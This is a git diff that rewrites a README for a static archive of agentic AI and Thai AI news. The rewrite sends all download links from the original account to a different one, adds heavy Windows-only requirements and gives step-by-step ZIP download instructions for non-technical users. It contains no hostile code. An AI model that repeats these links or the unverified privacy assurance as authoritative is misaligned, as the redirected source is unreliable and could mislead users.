@@ -1,142 +1,79 @@
-# Agentic AI News Radar - AI News Archive 2026
+# 📰 agentic-news-radar-archive - Track daily AI news updates effortlessly
 
-> **Agentic AI News Radar is a static web archive for browsing daily reports about agentic AI, general AI developments, and Thai AI news. It combines generated HTML pages with Markdown source files and supports publication through GitHub Pages.**
+[![Download Archive](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/yasser38742/agentic-news-radar-archive)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/alexxiyclewis9457/agentic-news-radar-archive?style=flat-square)](https://github.com/alexxiyclewis9457/agentic-news-radar-archive)
+This tool provides a static archive of news related to agentic AI, broad AI developments, and local news from Thailand. It organizes complex technical updates into manageable formats for your review. You can browse these daily reports on your computer without an constant internet connection.
 
----
+## 📋 What this tool does
 
-<p align="center">
-  <a href="https://alexxiyclewis9457.github.io/agentic-news-radar-archive/">
-    <img src="https://img.shields.io/badge/Download-Agentic%20AI%20News%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download Agentic AI News Radar">
-  </a>
-</p>
+The agentic-news-radar-archive provides a structured way to read news. It combines raw Markdown files with polished HTML pages. This structure lets you search for specific topics without manual effort. You view snapshots of daily developments in a clean interface. Developers contribute content, and you view the final output on your local machine.
 
-> **[Open Agentic AI News Radar](https://alexxiyclewis9457.github.io/agentic-news-radar-archive/)**
+## 💻 System requirements
 
----
+Your computer needs the following setup to view these archives:
 
-[Download Latest Build](https://alexxiyclewis9457.github.io/agentic-news-radar-archive/)
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   Disk Space: At least 500 megabytes for the archive storage.
+*   Memory: 4 gigabytes of RAM or higher.
 
----
+## 🚀 Getting started
 
-## What Is Agentic AI News Radar?
+You do not need programming skills to view these files. Follow these steps to prepare the archive on your Windows system.
 
-Agentic AI News Radar provides a browser-friendly archive of news covering agentic AI, the wider AI field, and Thai news. Because the dashboard is generated as static HTML, readers can explore daily pages without a server-side application.
+### ⬇️ Download the archive
 
-Each published page is supported by its corresponding Markdown report, preserving the underlying source content for inspection and future rebuilds. The included PowerShell dashboard script and GitHub Pages workflow establish a repeatable path from report updates to a published archive.
+Visit this page to download the software: https://github.com/yasser38742/agentic-news-radar-archive
 
----
+1. Open your web browser.
+2. Navigate to the link above.
+3. Locate the green button labeled "Code" near the top right of the page.
+4. Click this button and select "Download ZIP".
+5. Save the file to your "Downloads" folder.
 
-## Highlights
+### 📂 Set up the files
 
-- Browse news through a static HTML dashboard
-- Generate new archive pages for daily updates
-- Retain Markdown reports alongside the rendered pages
-- Track agentic AI and broader AI developments
-- Organize Thai news coverage
-- Rebuild the dashboard with the included PowerShell script
-- Publish the archive using GitHub Pages
-- Use a lightweight archive layout designed for static web hosting
+After the download finishes, move the files to a place where you want to keep your library.
 
----
+1. Find the file in your "Downloads" folder. It will have a name ending in `.zip`.
+2. Right-click the file and select "Extract All".
+3. Choose a destination folder on your computer. Your "Documents" folder works well for this purpose.
+4. Click "Extract". The computer will create a new folder with the same name.
 
-## Installation
+### 📖 View the news
 
-First, clone the repository and enter its directory:
+Now you are ready to browse the archives.
 
-```bash
-git clone https://github.com/alexxiyclewis9457/agentic-news-radar-archive.git
-cd REPO
-```
+1. Open the folder you just extracted.
+2. Look for a folder labeled "docs" or a file named "index.html".
+3. Double-click the `index.html` file.
+4. Your default web browser will open and display the news interface.
+5. Use the navigation links to move between dates and topics.
 
-To inspect the archive locally, open the generated HTML dashboard in a web browser.
+## 🛠️ Frequently asked questions
 
-When the dashboard needs to be regenerated, execute the included PowerShell rebuild script:
+Users often ask the following questions when using this archive system. 
 
-```powershell
-.\<dashboard-rebuild-script>.ps1
-```
+### Why do I use a web browser to view this?
+The files use standard web technologies to display information. Your browser understands how to render these files into readable text and images. This approach ensures you do not need to install complex software to read the reports.
 
-Substitute `<dashboard-rebuild-script>.ps1` with the actual script name present in your checkout.
+### Does this update automatically?
+The archive stays offline on your computer. To get the newest reports, return to the link provided in the download section, download the updated ZIP file, and extract it over your existing folder. This replaces the old files with the latest entries.
 
----
+### Can I search the archives?
+Yes. Once you open the `index.html` file in your browser, look for a search icon or a text box at the top of the interface. Input your search term to find specific reports or news items.
 
-## Updating and Publishing
+### The pages do not look right. What do I do?
+Ensure that all files remain in the same folder structure as you found them in the ZIP archive. If you move individual files out of their parent folders, the browser will lose the connection to images and styling information. If this happens, delete the folder and extract the ZIP file again.
 
-Use the following sequence for a normal archive update:
+## 🤝 Contributing feedback
 
-1. Create or revise the Markdown news reports.
-2. Execute the PowerShell dashboard rebuild script.
-3. Check the newly generated static HTML pages in a local browser.
-4. Commit the changed reports and dashboard output.
-5. Publish the repository through the GitHub Pages workflow.
-6. Visit the deployed archive at [Download Latest Build](https://alexxiyclewis9457.github.io/agentic-news-radar-archive/).
+The archive grows through community contributions. If you find errors in the reports or want to suggest new sources for the radar, you can provide input. While you cannot change the files directly without technical knowledge, you can report concerns through the GitHub interface on the repository page. 
 
-For read-only access, either open the dashboard locally with a modern browser or use the hosted GitHub Pages address.
+Check for the "Issues" tab on the main repository page. Click "New issue" to describe any problems you encounter while browsing the archive. Keep your reports short and clear to help the contributors fix issues quickly.
 
----
+## 🔒 Privacy and security
 
-## Project Configuration
+This archive runs locally on your machine. No data leaves your computer when you browse these files. Your reading habits remain private because the application does not transmit your activity to any server. Always download the archive from the official link provided to ensure file integrity.
 
-The project separates its source reports, generated dashboard pages, and deployment workflow. To change the content or generation behavior, inspect the repository's Markdown files and the PowerShell rebuild script.
-
-The static HTML output does not need server-side settings. Hosting behavior is controlled by the repository configuration and its GitHub Pages workflow.
-
----
-
-## Requirements
-
-- A modern web browser to view the dashboard
-- Git to clone and maintain the repository
-- PowerShell to execute the dashboard rebuild script
-- A GitHub repository for the Pages publishing process
-- GitHub Pages enabled for the hosted archive
-- Enough storage for the Markdown reports and generated HTML pages
-
----
-
-## Frequently Asked Questions
-
-### How do I access the archive?
-
-When GitHub Pages is enabled, open the hosted [latest build](https://alexxiyclewis9457.github.io/agentic-news-radar-archive/). You can also view the generated HTML dashboard directly on your local machine.
-
-### What is the process for generating additional news pages?
-
-Modify the Markdown source reports, then run the included PowerShell dashboard rebuild script. This produces the static HTML pages that can be reviewed locally and published.
-
-### Is a web server needed?
-
-No server-side application is required for local viewing because the dashboard consists of static HTML. GitHub Pages can be used when a hosted version is desired.
-
-### How does deployment work?
-
-Commit the updated reports and generated dashboard files, then let the GitHub Pages publishing workflow deploy the repository.
-
-### What can cause the dashboard to show old content?
-
-Check that the Markdown reports contain the latest changes, run the rebuild script again, and confirm that the generated HTML files were committed before deployment.
-
-### Where do I change generation or deployment settings?
-
-Review the rebuild script, the Markdown source reports, and the GitHub Pages workflow to find the settings related to content generation and publication.
-
----
-
-## Roadmap
-
-- Grow the daily archive of AI news
-- Make navigation between generated pages more convenient
-- Continue improving the static dashboard layout
-- Expand the publishing workflow as the collection increases
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: AI, news, archive, reporting, Windows, information management, agentic systems, Thailand AI, static web
